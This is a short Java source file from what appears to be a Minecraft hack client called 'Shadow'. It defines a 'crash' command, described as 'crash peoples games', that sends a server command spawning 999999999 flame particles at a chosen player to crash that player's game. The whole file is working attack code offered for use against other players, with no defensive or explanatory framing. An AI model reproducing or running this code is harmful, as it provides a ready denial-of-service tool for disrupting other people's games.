package net.shadow.client.feature.command.impl;

import java.util.Objects;

import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.command.Command;
import net.shadow.client.helper.util.Utils;

public class Crash extends Command {
    public Crash() {
        super("crash", "crash peoples games", "crash", "c");
    }

    @Override
    public String[] getSuggestions(String fullCommand, String[] args) {
        if(args.length == 1){
            return Objects.requireNonNull(ShadowMain.client.world).getPlayers().stream().map(abstractClientPlayerEntity -> abstractClientPlayerEntity.getGameProfile().getName()).toList().toArray(String[]::new);
        }
        return super.getSuggestions(fullCommand, args);
    }

    @Override
    public void onExecute(String[] args) {
        String player = Utils.Players.completeName(args[0]);
        ShadowMain.client.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/execute as " + player + " at @s run particle flame ~ ~ ~ 1 1 1 0 999999999 normal @s"));
        message(player + " should be crashed");
    }
}
